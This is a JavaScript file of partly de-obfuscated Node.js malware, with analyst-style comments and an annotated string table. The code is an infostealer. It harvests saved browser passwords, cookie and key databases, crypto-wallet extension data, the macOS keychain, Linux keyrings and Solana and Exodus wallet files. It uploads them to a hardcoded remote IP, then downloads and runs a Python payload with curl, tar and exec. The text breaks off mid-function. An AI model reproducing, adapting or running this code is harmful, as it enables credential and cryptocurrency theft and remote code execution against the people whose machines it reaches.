/* eslint-disable no-func-assign */
Object.prototype.toString, Object.defineProperties;
const decodeValueAlias = decodeValue;
const Buffer = require('buffer').Buffer;
(function (a8, a9) {
	const getDecodedValue = decodeValue,
		decodedArray = a8();
	while (!![]) {
		try {
			const ab = -parseInt(getDecodedValue(0x110)) / 0x1 + parseInt(getDecodedValue(0x12c)) / 0x2 + parseInt(getDecodedValue(0x126)) / 0x3 * (parseInt(getDecodedValue(0x13d)) / 0x4) + -parseInt(getDecodedValue(0xef)) / 0x5 * (-parseInt(getDecodedValue(0x15b)) / 0x6) + parseInt(getDecodedValue(0x176)) / 0x7 * (-parseInt(getDecodedValue(0x111)) / 0x8) + -parseInt(getDecodedValue(0x148)) / 0x9 * (-parseInt(getDecodedValue(0xfc)) / 0xa) + -parseInt(getDecodedValue(0x104)) / 0xb;
			if (ab === a9) break;
			else decodedArray['push'](decodedArray['shift']());
		} catch (ac) {
			decodedArray['push'](decodedArray['shift']());
		}
	}
}(getDecodedArray, 0x919be));
const a5 = (function () {
	let a8 = !![];
	return function (a9, aa) {
		const ab = a8 ? function () {
			const au = decodeValue;
			if (aa) {
				const ac = aa[au(0xf5)](a9, arguments);
				return aa = null, ac;
			}
		} : function () { };
		return a8 = ![], ab;
	};
}()),
	a4 = a5(this, function () {
		const av = decodeValue;
		return a4[av(0xf2)]()[av(0xfe)](av(0x14c))[av(0xf2)]()['constructor'](a4)[av(0xfe)](av(0x14c));
	});
a4();
// const a3 = (function () {
// 	let a8 = !![];
// 	return function (a9, aa) {
// 		const ab = a8 ? function () {
// 			if (aa) {
// 				const ac = aa['apply'](a9, arguments);
// 				return aa = null, ac;
// 			}
// 		} : function () { };
// 		return a8 = ![], ab;
// 	};
// }());

function decodeValue(index1, index2) {
	const decodedArray = getDecodedArray(); // Assume a6() returns an array used for decoding
	// Reassign the function to decode based on an adjusted offset
	decodeValue = function (offset, index) {
		offset = offset - 0xeb;  // Adjust offset to match array index
		return decodedArray[offset];
	};
	return decodeValue(index1, index2);
}

// Self-invoking function for obfuscation or protection purposes
(function () {
	// The function inside gets invoked immediately
	(function () {
		const regexPattern1 = new RegExp(decodeValue(0x160)),  // Create regex with decoded string
			regexPattern2 = new RegExp('\\+\\+\\s*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),  // Create regex to match patterns like "++ variableName"
			initialize = evaluateInput('init');  // Assuming a2 initializes or retrieves some value based on 'init'

		// Check if regex patterns match concatenated strings, if not, initialize with '0'
		if (!regexPattern1.test(initialize + 'chain') || !regexPattern2.test(initialize + decodeValue(0x129))) {
			initialize('0');  // If conditions are not met, initialize with '0'
		} else {
			evaluateInput();  // If conditions are met, invoke a2 without arguments
		}
	})();
})();


function getDecodedArray() {
    const b3 = [
        /* |0x0 - 0xeb| = 0xeb */ 'L0Library/Keychains/login.keychain',
        /* |0x1 - 0xeb| = 0xea */ 'zSync',
        /* |0x2 - 0xeb| = 0xe9 */ 'L0Library/Application Support/',
        /* |0x3 - 0xeb| = 0xe8 */ 'node:process',
        /* |0x4 - 0xeb| = 0xe7 */ 'plld_',
        /* |0x5 - 0xeb| = 0xe6 */ 'opera',
        /* |0x6 - 0xeb| = 0xe5 */ 'length',
        /* |0x7 - 0xeb| = 0xe4 */ '12CvDfbn',
        /* |0x8 - 0xeb| = 0xe3 */ 'base64',
        /* |0x9 - 0xeb| = 0xe2 */ '/pdown',
        /* |0xa - 0xeb| = 0xe1 */ '/keys',
        /* |0xb - 0xeb| = 0xe0 */ 'while (true) {}',
        /* |0xc - 0xeb| = 0xdf */ 'function *\\( *\\)',
        /* |0xd - 0xeb| = 0xde */ 'exception',
        /* |0xe - 0xeb| = 0xdd */ 'debu',
        /* |0xf - 0xeb| = 0xdc */ 'aHdcondbcbdnbeepgdpgh',
        /* |0x10 - 0xeb| = 0xdb */ 'fk4_',
        /* |0x11 - 0xeb| = 0xda */ 'comp',
        /* |0x12 - 0xeb| = 0xd9 */ 'caHostname',
        /* |0x13 - 0xeb| = 0xd8 */ 'jfhomiihkjbmgjidlcdno',
        /* |0x14 - 0xeb| = 0xd7 */ 'forEach',
        /* |0x15 - 0xeb| = 0xd6 */ 'key4.db',
        /* |0x16 - 0xeb| = 0xd5 */ 'BraveSoftware/Brave-Browser',
        /* |0x17 - 0xeb| = 0xd4 */ 'error',
        /* |0x18 - 0xeb| = 0xd3 */ '3C1',
        /* |0x19 - 0xeb| = 0xd2 */ 'get',
        /* |0x1a - 0xeb| = 0xd1 */ 'pld_',
        /* |0x1b - 0xeb| = 0xd0 */ 'stateObject',
        /* |0x1c - 0xeb| = 0xcf */ 'zpath',
        /* |0x1d - 0xeb| = 0xce */ '/ld_',
        /* |0x1e - 0xeb| = 0xcd */ 'epccibookckonoeemg',
        /* |0x1f - 0xeb| = 0xcc */ '@userInfo',
        /* |0x20 - 0xeb| = 0xcb */ 'info',
        /* |0x21 - 0xeb| = 0xca */ 'cmrename',
        /* |0x22 - 0xeb| = 0xc9 */ '15820Xesbgc',
        /* |0x23 - 0xeb| = 0xc8 */ '__proto__',
        /* |0x24 - 0xeb| = 0xc7 */ 'copyFile',
        /* |0x25 - 0xeb| = 0xc6 */ 'return (function() ',
        /* |0x26 - 0xeb| = 0xc5 */ 'zboptions',
        /* |0x27 - 0xeb| = 0xc4 */ 'hifagmcddpe',
        /* |0x28 - 0xeb| = 0xc3 */ 'Local Exte',
        /* |0x29 - 0xeb| = 0xc2 */ '1301015Wdbuzl',
        /* |0x2a - 0xeb| = 0xc1 */ 'from',
        /* |0x2b - 0xeb| = 0xc0 */ 'logkc-db',
        /* |0x2c - 0xeb| = 0xbf */ 'toString',
        /* |0x2d - 0xeb| = 0xbe */ 'test',
        /* |0x2e - 0xeb| = 0xbd */ 'curl -Lo',
        /* |0x2f - 0xeb| = 0xbc */ 'apply',
        /* |0x30 - 0xeb| = 0xbb */ 'replace',
        /* |0x31 - 0xeb| = 0xba */ 'bfnalmomeimhplp',
        /* |0x32 - 0xeb| = 0xb9 */ 'dgcjinmhnfnkdnad',
        /* |0x33 - 0xeb| = 0xb8 */ 'ejbalbakoplcglg',
        /* |0x34 - 0xeb| = 0xb7 */ 'bind',
        /* |0x35 - 0xeb| = 0xb6 */ 'aeachknmefph',
        /* |0x36 - 0xeb| = 0xb5 */ '10CLvyiU',
        /* |0x37 - 0xeb| = 0xb4 */ '/.local/share/keyrings/',
        /* |0x38 - 0xeb| = 0xb3 */ 'search',
        /* |0x39 - 0xeb| = 0xb2 */ 'python',
        /* |0x3a - 0xeb| = 0xb1 */ 'tar -xf',
        /* |0x3b - 0xeb| = 0xb0 */ 'ycplatform',
        /* |0x3c - 0xeb| = 0xaf */ 'fk3_',
        /* |0x3d - 0xeb| = 0xae */ 'cXexec',
        /* |0x3e - 0xeb| = 0xad */ '5001172MTyOQq',
        /* |0x3f - 0xeb| = 0xac */ 'achild_p',
        /* |0x40 - 0xeb| = 0xab */ 'Local/',
        /* |0x41 - 0xeb| = 0xaa */ 'fllj_',
        /* |0x42 - 0xeb| = 0xa9 */ 'nkbiihfbeogaeaoe',
        /* |0x43 - 0xeb| = 0xa8 */ 'ibnejdfmjmmkpcnl',
        /* |0x44 - 0xeb| = 0xa7 */ 'cmrenameSync',
        /* |0x45 - 0xeb| = 0xa6 */ 'action',
        /* |0x46 - 0xeb| = 0xa5 */ 'Sync Extension Settings',
        /* |0x47 - 0xeb| = 0xa4 */ 'com.operasoftware.Opera',
        /* |0x48 - 0xeb| = 0xa3 */ 'logins.json',
        /* |0x49 - 0xeb| = 0xa2 */ 'Local/Microsoft/Edge',
        /* |0x4a - 0xeb| = 0xa1 */ '157006jXcNqH',
        /* |0x4b - 0xeb| = 0xa0 */ '216ywUfiT',
        /* |0x4c - 0xeb| = 0x9f */ 'slice',
        /* |0x4d - 0xeb| = 0x9e */ 'Default',
        /* |0x4e - 0xeb| = 0x9d */ 'atomic/Local Storage/leveldb',
        /* |0x4f - 0xeb| = 0x9c */ '/.npl',
        /* |0x50 - 0xeb| = 0x9b */ 'pebklmnkoeoihoec',
        /* |0x51 - 0xeb| = 0x9a */ '\\.py\\python',
        /* |0x52 - 0xeb| = 0x99 */ 'prototype',
        /* |0x53 - 0xeb| = 0x98 */ 'console',
        /* |0x54 - 0xeb| = 0x97 */ 'Roaming/Opera Software/Opera Stable',
        /* |0x55 - 0xeb| = 0x96 */ '/AppData/',
        /* |0x56 - 0xeb| = 0x95 */ 'pdliogeghdb',
        /* |0x57 - 0xeb| = 0x94 */ '" "',
        /* |0x58 - 0xeb| = 0x93 */ 'mcohlncbfah',
        /* |0x59 - 0xeb| = 0x92 */ 'utf8',
        /* |0x5a - 0xeb| = 0x91 */ 'kplomjkjfgodnhcellj',
        /* |0x5b - 0xeb| = 0x90 */ '{}.constructor("return this")( )',
        /* |0x5c - 0xeb| = 0x8f */ 'fhbohimaelbohpj',
        /* |0x5d - 0xeb| = 0x8e */ 'ycreq',
        /* |0x5e - 0xeb| = 0x8d */ '-db',
        /* |0x5f - 0xeb| = 0x8c */ 'writeFileSync',
        /* |0x60 - 0xeb| = 0x8b */ '208605RpQjmy',
        /* |0x61 - 0xeb| = 0x8a */ 'hon.exe',
        /* |0x62 - 0xeb| = 0x89 */ 'counter',
        /* |0x63 - 0xeb| = 0x88 */ 'input',
        /* |0x64 - 0xeb| = 0x87 */ ' -C ',
        /* |0x65 - 0xeb| = 0x86 */ 'rmSync',
        /* |0x66 - 0xeb| = 0x85 */ '729744vfCEAz',
        /* |0x67 - 0xeb| = 0x84 */ 'createReadStream',
        /* |0x68 - 0xeb| = 0x83 */ 'string',
        /* |0x69 - 0xeb| = 0x82 */ 'aholpfdialjg',
        /* |0x6a - 0xeb| = 0x81 */ 'statSync',
        /* |0x6b - 0xeb| = 0x80 */ 'constructor',
        /* |0x6c - 0xeb| = 0x7f */ 'duest',
        /* |0x6d - 0xeb| = 0x7e */ 'exod',
        /* |0x6e - 0xeb| = 0x7d */ 'atmc',
        /* |0x6f - 0xeb| = 0x7c */ 'flj_',
        /* |0x70 - 0xeb| = 0x7b */ 'flk4_',
        /* |0x71 - 0xeb| = 0x7a */ '/.config/solana/id.json',
        /* |0x72 - 0xeb| = 0x79 */ 'Profile',
        /* |0x73 - 0xeb| = 0x78 */ 'egjidjbpglic',
        /* |0x74 - 0xeb| = 0x77 */ 'Roaming/',
        /* |0x75 - 0xeb| = 0x76 */ 'key3.db',
        /* |0x76 - 0xeb| = 0x75 */ 'gger',
        /* |0x77 - 0xeb| = 0x74 */ '20rHSOIN',
        /* |0x78 - 0xeb| = 0x73 */ 'size',
        /* |0x79 - 0xeb| = 0x72 */ 'push',
        /* |0x7a - 0xeb| = 0x71 */ 'username',
        /* |0x7b - 0xeb| = 0x70 */ 'Jvcess',
        /* |0x7c - 0xeb| = 0x6f */ 'now',
        /* |0x7d - 0xeb| = 0x6e */ 'trace',
        /* |0x7e - 0xeb| = 0x6d */ '67.203.171:1244',
        /* |0x7f - 0xeb| = 0x6c */ 'Login Data',
        /* |0x80 - 0xeb| = 0x6b */ '/brld_',
        /* |0x81 - 0xeb| = 0x6a */ '/User Data',
        /* |0x82 - 0xeb| = 0x69 */ '325251TaqLYU',
        /* |0x83 - 0xeb| = 0x68 */ 'arg',
        /* |0x84 - 0xeb| = 0x67 */ 'brld_',
        /* |0x85 - 0xeb| = 0x66 */ 'Ztimestamp',
        /* |0x86 - 0xeb| = 0x65 */ '(((.+)+)+)+$',
        /* |0x87 - 0xeb| = 0x64 */ 'hecdalmeeajnimhm',
        /* |0x88 - 0xeb| = 0x63 */ 'N7EAM7',
        /* |0x89 - 0xeb| = 0x62 */ 'table',
        /* |0x8a - 0xeb| = 0x61 */ 'mgjmjophhpkkoljpa',
        /* |0x8b - 0xeb| = 0x60 */ '/.config/',
        /* |0x8c - 0xeb| = 0x5f */ 'join',
        /* |0x8d - 0xeb| = 0x5e */ 'Yvalue'
    ];
    return () => b3;
}
const a1 = (function () {
	let a8 = !![];
	return function (a9, aa) {
		const ab = a8 ? function () {
			const ax = decodeValue;
			if (aa) {
				const ac = aa[ax(0xf5)](a9, arguments);
				return aa = null, ac;
			}
		} : function () { };
		return a8 = ![], ab;
	};
}()),
	a0 = a1(this, function () {
		const getDecodedValue = decodeValue;
		let a8;
		try {
			const ab = Function(getDecodedValue(0xeb) + getDecodedValue(0x121) + ');');
			a8 = ab();
		} catch (ac) {
			a8 = window;
		}
		const a9 = a8[getDecodedValue(0x119)] = a8[getDecodedValue(0x119)] || {},
			aa = ['log', 'warn', getDecodedValue(0x174), getDecodedValue(0x16b), getDecodedValue(0x161), getDecodedValue(0x14f), getDecodedValue(0x143)];
		for (let ad = 0x0; ad < aa[getDecodedValue(0x15a)]; ad++) {
			const ae = a1[getDecodedValue(0x131)][getDecodedValue(0x118)]['bind'](a1),
				af = aa[ad],
				ag = a9[af] || ae;
			ae[getDecodedValue(0x177)] = a1[getDecodedValue(0xfa)](a1), ae[getDecodedValue(0xf2)] = ag[getDecodedValue(0xf2)][getDecodedValue(0xfa)](ag), a9[af] = ae;
		}
	});
a0();
const t = decodeValueAlias(0x15c),
	c = decodeValueAlias(0x11f),
	a = require('fs'),
	r = require('os'),
	$ = a8 => {
		let s1 = a8[decodeValueAlias(0x112)](0x1);
		return Buffer[decodeValueAlias(0xf0)](s1, t)[decodeValueAlias(0xf2)](c);
	};
let rq = require($(decodeValueAlias(0x123) + decodeValueAlias(0x132))), pt = require($(decodeValueAlias(0x170))), ex = require($(decodeValueAlias(0x105) + decodeValueAlias(0x141)))[$(decodeValueAlias(0x103))], zv = require($(decodeValueAlias(0x157))), hd = r[$('ZaG9tZWRpcg')](), hs = r[$(decodeValueAlias(0x166))](), pl = r[$(decodeValueAlias(0x101))](), uin = r[$(decodeValueAlias(0x173))](), td = r[$('cdG1wZGly')]();
let n;
const l = a8 => Buffer[decodeValueAlias(0xf0)](a8, t)[decodeValueAlias(0xf2)](c),
	s = () => {
		const aA = decodeValueAlias;
		let a8 = aA(0x144);
		for (var a9 = '', aa = '', ab = '', ac = '', ad = 0x0; ad < 0xa; ad++) a9 += a8[ad], aa += a8[0xa + ad], ab += a8[0x14 + ad], ac += a8[0x1e + ad];
		return a9 = a9 + ab + ac, l(aa) + l(a9);
	},
	e = a8 => a8[decodeValueAlias(0xf6)](/^~([a-z]+|\/)/, (a9, aa) => '/' === aa ? hd : pt[l('ZGlybmFtZQ')](hd) + '/' + aa),
	h = decodeValueAlias(0x14e),
	o = decodeValueAlias(0x16d),
	Z = decodeValueAlias(0x115),
	b = decodeValueAlias(0x125),
	u = 'L2NsaWVudA',
	i = decodeValueAlias(0x117),
	y = decodeValueAlias(0x127);

function G(a8) {
	const aB = decodeValueAlias,
		a9 = l('YWNjZXN' + aB(0x155));
	try {
		return a[a9](a8), !0x0;
	} catch (aa) {
		return !0x1;
	}
}
const m = l('ZXhpc3RzU3luYw');

function p(a8) {
	return a[m](a8);
}

function d(a8) {
	const scrs = l(aC(0x12d));
	return a[scrs](a8);
}
const W = decodeValueAlias(0x145),
	Y = decodeValueAlias(0x178),
	f = l(decodeValueAlias(0x113)),
	w = l(decodeValueAlias(0x138)),
	v = $('aZmlsZW5hbWU'),
	V = $('cZm9ybURhdGE'),
	j = $('adXJs'),
	L = $(decodeValueAlias(0xec)),
	z = $(decodeValueAlias(0x153)),
	N = l('cmVhZGRpclN5bmM'),
	R = l(decodeValueAlias(0x130)),
	X = l('cG9zdA'),
	k = decodeValueAlias(0x151),
	F = decodeValueAlias(0x11b),
	x = decodeValueAlias(0x147),
	g = decodeValueAlias(0x156),
	U = decodeValueAlias(0x16a),
	_ = 'R29vZ2xlL0Nocm9tZQ',
	q = 'Z29vZ2xlLWNocm9tZQ',
	B = [decodeValueAlias(0x106) + U, U, U],
	J = [decodeValueAlias(0x11a), decodeValueAlias(0x10d), decodeValueAlias(0x159)],
	Q = [decodeValueAlias(0x106) + _, _, q];
let T = decodeValueAlias(0x165);
const H = a8 => {
	const aD = decodeValueAlias,
		a9 = $('YbXVsdGlfZmlsZQ'),
		aa = $(aD(0x14b)),
		ab = l('L3VwbG9hZHM'),
		ac = {
			[aa]: n['toString'](),
			'type': h,
			'hid': T,
			[a9]: a8
		},
		ad = s();
	try {
		let ae = {
			[j]: '' + ad + ab,
			[V]: ac
		};
		rq[X](ae, (af, ag, ah) => { });
	} catch (af) { }
},
	S = ['aGxlZm5rb2RiZWZncGdrbm4', decodeValueAlias(0x14d), decodeValueAlias(0x116), 'YmJsZGNuZ2NuYXBuZG9kanA', decodeValueAlias(0xf8), decodeValueAlias(0x150), decodeValueAlias(0x172), decodeValueAlias(0x163), decodeValueAlias(0x120), decodeValueAlias(0x167), 'Ym1nZGprYnBlbWNjaWlvbGdjZ2U', 'aGJubWtrbGllZ2htbWprcGlncGE'],
	A = [decodeValueAlias(0x108), decodeValueAlias(0xf9), decodeValueAlias(0x109), decodeValueAlias(0x122), 'aG5mYW5rbm9jZmVvZmJk', decodeValueAlias(0xf7), decodeValueAlias(0xfb), decodeValueAlias(0x139), decodeValueAlias(0xed), decodeValueAlias(0x12f), decodeValueAlias(0x11e), decodeValueAlias(0x11c)],
	C = async (a8, a9, aa) => {
		const aE = decodeValueAlias;
		let ab = a8;
		if (!ab || '' === ab) return [];
		try {
			if (!G(ab)) return [];
		} catch (ag) {
			return [];
		}
		a9 || (a9 = '');
		let ac = [];
		const ad = l(aE(0xee) + '5zaW9uIFNldHRpbmdz'),
			ae = l(aE(0x10c)),
			af = l('YmhnaG9hbWFwY2RwYm9ocGhpZ29vb2FkZGlucGtiYWk');
		for (let ah = 0x0; ah < 0xc8; ah++) {
			const ai = 0x0 === ah ? f : w + ' ' + ah,
				aj = a8 + '/' + ai + '/' + ad;
			for (let al = 0x0; al < A[aE(0x15a)]; al++) {
				const am = l(A[al] + S[al]);
				let an = aj + '/' + am;
				if (G(an)) {
					try {
						far = a[N](an);
					} catch (ao) {
						far = [];
					}
					far['forEach'](async ap => {
						const aF = aE;
						ab = pt[aF(0x152)](an, ap);
						try {
							ac['push']({
								[L]: {
									[v]: '' + a9 + ah + '_' + am + '_' + ap
								},
								[z]: d(ab)
							});
						} catch (aq) { }
					});
				}
			}
			const ak = a8 + '/' + ai + '/' + ae + '/' + af;
			if (G(ak)) {
				try {
					far = a[N](ak);
				} catch (ap) {
					far = [];
				}
				far[aE(0x168)](async aq => {
					const aG = aE;
					ab = pt[aG(0x152)](ak, aq);
					try {
						ac[aG(0x13f)]({
							[L]: {
								[v]: '' + a9 + ah + '_' + af + '_' + aq
							},
							[z]: d(ab)
						});
					} catch (ar) { }
				});
			}
		}
		if (aa) {
			const aq = l('c29sYW5hX2lkLnR4dA');
			if (ab = '' + hd + l(aE(0x137)), p(ab)) try {
				ac[aE(0x13f)]({
					[z]: d(ab),
					[L]: {
						[v]: aq
					}
				});
			} catch (ar) { }
		}
		return H(ac), ac;
	}, E = async () => {
		const getDecodeValue = decodeValueAlias;
		T = hs, 'd' == pl[0x0] && (T = T + '+' + uin[l(getDecodeValue(0x140))]), await ut();
		try {
			const a8 = e('~/');
			await M(Q, 0x0), await M(B, 0x1), await M(J, 0x2), 'w' == pl[0x0] ? (pa = '' + a8 + l(F) + l(getDecodeValue(0x10f)) + l(x), await C(pa, '3_', !0x1)) : 'l' == pl[0x0] ? (await O(), await Zt(), await $t()) : 'd' == pl[0x0] && (await ((async () => {
				const aI = getDecodeValue;
				let a9 = [];
				const aa = l(W),
					ab = l(aI(0x154)),
					ac = l(aI(0xf1));
				if (pa = '' + hd + ab, p(pa)) try {
					a9['push']({
						[z]: d(pa),
						[L]: {
							[v]: ac
						}
					});
				} catch (ad) { } else {
					if (pa += aI(0x124), p(pa)) try {
						a9[aI(0x13f)]({
							[z]: d(pa),
							[L]: {
								[v]: ac
							}
						});
					} catch (ae) { }
				}
				try {
					const af = l(Y);
					let ag = '';
					if (ag = '' + hd + l(g) + l(_), ag && '' !== ag && G(ag))
						for (let ah = 0x0; ah < 0xc8; ah++) {
							const ai = ag + '/' + (0x0 === ah ? f : w + ' ' + ah) + '/' + aa;
							try {
								if (!G(ai)) continue;
								const aj = ag + aI(0x171) + ah;
								G(aj) ? a9[aI(0x13f)]({
									[z]: d(aj),
									[L]: {
										[v]: aI(0x16e) + ah
									}
								}) : a[af](ai, aj, ak => {
									const aJ = aI;
									let al = [{
										[z]: d(ai),
										[L]: {
											[v]: aJ(0x16e) + ah
										}
									}];
									H(al);
								});
							} catch (ak) { }
						}
				} catch (al) { }
				return H(a9), a9;
			})()), await D(), await nt()), await I(K, l(ct)), await I(tt, l(at));
		} catch (a9) { }
	}, M = async (a8, a9) => {
		try {
			const aa = e('~/');
			let ab = '';
			ab = 'd' == pl[0x0] ? '' + aa + l(g) + l(a8[0x1]) : 'l' == pl[0x0] ? '' + aa + l(k) + l(a8[0x2]) : '' + aa + l(F) + l(a8[0x0]) + l(x), await C(ab, a9 + '_', 0x0 == a9);
		} catch (ac) { }
	}, I = async (a8, a9) => {
		try {
			const aa = e('~/');
			let ab = '';
			ab = 'd' == pl[0x0] ? '' + aa + l(g) + l(a8) : 'l' == pl[0x0] ? '' + aa + l(k) + l(a8) : '' + aa + l(F) + l(P) + l(a8), await rt(ab, a9);
		} catch (ac) { }
	}, D = async () => {
		const aK = decodeValueAlias;
		let a8 = [];
		const a9 = l(W);
		try {
			const aa = l(Y);
			let ab = '';
			if (ab = '' + hd + l(g) + l(U), !ab || '' === ab || !G(ab)) return [];
			let ac = 0x0;
			for (; ac < 0xc8;) {
				const ad = ab + '/' + (0x0 !== ac ? w + ' ' + ac : f) + '/' + a9;
				try {
					if (G(ad)) {
						const ae = ab + aK(0x146) + ac;
						G(ae) ? a8[aK(0x13f)]({
							[z]: d(ae),
							[L]: {
								[v]: aK(0x14a) + ac
							}
						}) : a[aa](ad, ae, af => {
							const aL = aK;
							let ag = [{
								[z]: d(ad),
								[L]: {
									[v]: aL(0x14a) + ac
								}
							}];
							H(ag);
						});
					}
				} catch (af) { }
				ac++;
			}
		} catch (ag) { }
		return H(a8), a8;
	}, O = async () => {
		const aM = decodeValueAlias;
		let a8 = [];
		try {
			const a9 = l(aM(0xfd));
			let aa = '';
			aa = '' + hd + a9;
			let ab = [];
			if (aa && '' !== aa && G(aa)) try {
				ab = a[N](aa);
			} catch (ac) {
				ab = [];
			}
			ab['forEach'](async ad => {
				const aN = aM;
				pa = pt[aN(0x152)](aa, ad);
				try {
					ldb_data[aN(0x13f)]({
						[z]: d(pa),
						[L]: {
							[v]: '' + ad
						}
					});
				} catch (ae) { }
			});
		} catch (ad) { }
		return H(a8), a8;
	}, P = decodeValueAlias(0x13a), K = 'RXhvZHVzL2V4b2R1cy53YWxsZXQ', tt = decodeValueAlias(0x114), ct = decodeValueAlias(0x133), at = decodeValueAlias(0x134), rt = async (a8, a9) => {
		const aO = decodeValueAlias;
		let aa = [];
		if (!a8 || '' === a8) return [];
		try {
			if (!G(a8)) return [];
		} catch (ab) {
			return [];
		}
		a9 || (a9 = '');
		try {
			far = a[N](a8), far[aO(0x168)](async ac => {
				const aP = aO;
				let ad = pt[aP(0x152)](a8, ac);
				try {
					aa[aP(0x13f)]({
						[L]: {
							[v]: a9 + '_' + ac
						},
						[z]: d(ad)
					});
				} catch (ae) { }
			});
		} catch (ac) { }
		return H(aa), aa;
	}, $t = async () => {
		const aQ = decodeValueAlias;
		let a8 = [];
		const a9 = l(aQ(0x169)),
			aa = l(aQ(0x13b)),
			ab = l('bG9naW5zLmpzb24');
		try {
			let ac = '';
			if (ac = '' + hd + l('Ly5tb3ppbGxhL2ZpcmVmb3gv'), ac && '' !== ac && G(ac))
				for (let ad = 0x0; ad < 0xc8; ad++) {
					const ae = 0x0 === ad ? f : w + ' ' + ad;
					try {
						const af = ac + '/' + ae + '/' + a9;
						G(af) && a8[aQ(0x13f)]({
							[z]: d(af),
							[L]: {
								[v]: aQ(0x136) + ad
							}
						});
					} catch (ag) { }
					try {
						const ah = ac + '/' + ae + '/' + aa;
						G(ah) && a8[aQ(0x13f)]({
							[z]: d(ah),
							[L]: {
								[v]: 'flk3_' + ad
							}
						});
					} catch (ai) { }
					try {
						const aj = ac + '/' + ae + '/' + ab;
						G(aj) && a8[aQ(0x13f)]({
							[z]: d(aj),
							[L]: {
								[v]: aQ(0x107) + ad
							}
						});
					} catch (ak) { }
				}
		} catch (al) { }
		return H(a8), a8;
	}, nt = async () => {
		const aR = decodeValueAlias;
		let a8 = [];
		const a9 = l(aR(0x169)),
			aa = l(aR(0x13b)),
			ab = l(aR(0x10e));
		try {
			let ac = '';
			if (ac = '' + hd + l(g) + l('RmlyZWZveA'), ac && '' !== ac && G(ac))
				for (let ad = 0x0; ad < 0xc8; ad++) {
					const ae = 0x0 === ad ? f : w + ' ' + ad;
					try {
						const af = ac + '/' + ae + '/' + a9;
						G(af) && a8[aR(0x13f)]({
							[z]: d(af),
							[L]: {
								[v]: aR(0x164) + ad
							}
						});
					} catch (ag) { }
					try {
						const ah = ac + '/' + ae + '/' + aa;
						G(ah) && a8[aR(0x13f)]({
							[z]: d(ah),
							[L]: {
								[v]: aR(0x102) + ad
							}
						});
					} catch (ai) { }
					try {
						const aj = ac + '/' + ae + '/' + ab;
						G(aj) && a8[aR(0x13f)]({
							[z]: d(aj),
							[L]: {
								[v]: aR(0x135) + ad
							}
						});
					} catch (ak) { }
				}
		} catch (al) { }
		return H(a8), a8;
	};

function lt(a8) {
	const aS = decodeValueAlias,
		a9 = l(aS(0x12b));
	a[a9](a8);
}
const st = 0x3117870;
let et = 0x0;
const ht = async a8 => {
	const aT = decodeValueAlias,
		a9 = l(aT(0x100)) + ' ' + a8 + aT(0x12a) + hd;
	ex(a9, (aa, ab, ac) => {
		if (aa) return lt(a8), void (et = 0x0);
		lt(a8), bt();
	});
}, ot = () => {
	const aU = decodeValueAlias;
	if (et >= st + 0x4) return;
	const a8 = l('cDIuemlw'),
		a9 = s(),
		aa = td + '\x5c' + l('cC56aQ'),
		ab = td + '\x5c' + a8,
		ac = '' + a9 + l(aU(0x15d)),
		ad = l(aU(0x10a)),
		ae = l(aU(0x175));
	if (p(aa)) try {
		var af = a[R](aa);
		af[aU(0x13e)] >= st + 0x4 ? (et = af['size'], a[ae](aa, ab, ag => {
			if (ag) throw ag;
			ht(ab);
		})) : (et >= af[aU(0x13e)] ? (lt(aa), et = 0x0) : et = af[aU(0x13e)], it());
	} catch (ag) { } else {
		const ah = l(aU(0xf4)) + ' \x22' + aa + aU(0x11d) + ac + '\x22';
		ex(ah, (ai, aj, ak) => {
			if (ai) return et = 0x0, void it();
			try {
				et = st + 0x4, a[ad](aa, ab), ht(ab);
			} catch (al) { }
		});
	}
}, Zt = async () => {
	const aV = decodeValueAlias;
	let a8 = [];
	const a9 = l(W);
	try {
		const aa = l(Y);
		let ab = '';
		if (ab = '' + hd + l(k) + l(q), !ab || '' === ab || !G(ab)) return [];
		for (let ac = 0x0; ac < 0xc8; ac++) {
			const ad = ab + '/' + (0x0 === ac ? f : w + ' ' + ac) + '/' + a9;
			try {
				if (!G(ad)) continue;
				const ae = ab + aV(0x171) + ac;
				G(ae) ? a8[aV(0x13f)]({
					[z]: d(ae),
					[L]: {
						[v]: aV(0x158) + ac
					}
				}) : a[aa](ad, ae, af => {
					const aW = aV;
					let ag = [{
						[z]: d(ad),
						[L]: {
							[v]: aW(0x158) + ac
						}
					}];
					H(ag);
				});
			} catch (af) { }
		}
	} catch (ag) { }
	return H(a8), a8;
}, bt = async () => await new Promise((a8, a9) => {
	if ('w' != pl[0x0]) ((() => {
		const aX = decodeValue,
			aa = s(),
			ab = l(u),
			ac = l(b),
			ad = l(o),
			ae = l(Z),
			af = l(aX(0xff)),
			ag = '' + aa + ab + '/' + h,
			ah = '' + hd + ae;
		let ai = af + '3 \x22' + ah + '\x22';
		rq[ad](ag, (aj, ak, al) => {
			aj || (a[ac](ah, al), ex(ai, (am, an, ao) => { }));
		});
	})());
	else p('' + ('' + hd + l(i + y))) ? ((() => {
		const aY = decodeValue,
			aa = s(),
			ab = l(u),
			ac = l(o),
			ad = l(b),
			ae = l(Z),
			af = '' + aa + ab + '/' + h,
			ag = '' + hd + ae,
			ah = '\x22' + hd + l(i + y) + aY(0x11d) + ag + '\x22';
		try {
			lt(ag);
		} catch (ai) { }
		rq[ac](af, (aj, ak, al) => {
			if (!aj) try {
				a[ad](ag, al), ex(ah, (am, an, ao) => { });
			} catch (am) { }
		});
	})()) : ot();
}), ut = async () => {
	const aZ = decodeValueAlias;
	let a8 = aZ(0x16c);
	try {
		a8 += zv[l(aZ(0x149))][0x1];
	} catch (a9) { } (async (aa, ab) => {
		const b0 = aZ,
			ac = {
				'ts': n[b0(0xf2)](),
				'type': h,
				'hid': T,
				'ss': aa,
				'cc': ab[b0(0xf2)]()
			},
			ad = s(),
			ae = {
				[j]: '' + ad + l(b0(0x15e)),
				[V]: ac
			};
		try {
			rq[X](ae, (af, ag, ah) => { });
		} catch (af) { }
	})('jq', a8);
};

function it() {
	setTimeout(() => {
		ot();
	}, 0x4e20);
}
var yt = 0x0;
const Gt = async () => {
	const getDecodedValue = decodeValueAlias;
	try {
		n = Date[getDecodedValue(0x142)](), await E(), bt();
	} catch (err) { }
};
Gt();
let mt = setInterval(() => {
	(yt += 0x1) < 0x5 ? Gt() : clearInterval(mt);
}, 0x927c0);

function evaluateInput(input) {
	function innerFunction(counter) {
		const getDecodedValue = decodeValue;
		if (typeof counter === getDecodedValue(0x12e)) return function (ab) { }[getDecodedValue(0x131)](getDecodedValue(0x15f))[getDecodedValue(0xf5)](getDecodedValue(0x128));
		else ('' + counter / counter)[getDecodedValue(0x15a)] !== 0x1 || counter % 0x14 === 0x0 ? function () {
